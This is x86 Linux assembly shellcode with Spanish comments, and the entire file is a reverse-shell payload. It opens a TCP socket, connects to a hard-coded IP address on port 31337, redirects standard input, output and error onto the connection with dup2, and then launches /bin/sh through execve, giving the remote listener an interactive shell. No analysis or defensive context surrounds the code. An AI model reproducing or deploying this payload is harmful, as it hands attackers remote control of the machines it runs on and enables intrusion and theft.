section .text
global _start
_start:
xor  eax, eax ; Se limpian los registros
xor  ebx, ebx
xor  ecx, ecx
xor  edx, edx 
mov  al, 0x66 ; __NR_socketcall
mov  bl, 0x1 ; socket()
push ecx
push 0x6 ; IPPROTO_TCP
push 0x1 ; SOCK_STREAM
push 0x2 ; AF_INET
mov  ecx, esp
int  0x80 ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
mov  esi, eax ; esi = descriptor del socket
mov  al, 0x66 ; __NR_socketcall
mov  bl,0x2
			; Estructura sockaddr_in
push 0x7401a8c0 ; Direccion IP 
push 0x697a		; Puerto 31337
push bx ; AF_INET
inc  bl
mov  ecx,esp
push 0x10   ; sizeof(sockaddr_in)
push ecx 	; sockaddr_in
push esi	; descriptor del fichero
mov  ecx, esp 
int  0x80  ; connect(desc, &sockaddr_in, sizeof(sockaddr_in))
xor ecx, ecx
mov cl, 0x3 ; contador a 3
inicio_bucle:
dec cl		; Se decrementa el contador <--------o
mov al, 0x3f	; __NR_dup2						 |
int 0x80 		; se llama a dup2()				 |
jne	inicio_bucle	; Se repite el bucle --------o
xor eax, eax
push edx
push 0x68732f6e ;
push 0x69622f2f ; Se construye la cadena "//bin/sh\0"
mov ebx, esp ; 
push edx	; NULL
push ebx	; //bin/sh\0
mov ecx, esp ; args["//bin/sh",NULL]
push edx	; NULL
mov edx, esp	; envp[NULL]
mov al,0xb	; __NR_execve
int 0x80 	; Llamada a execve()
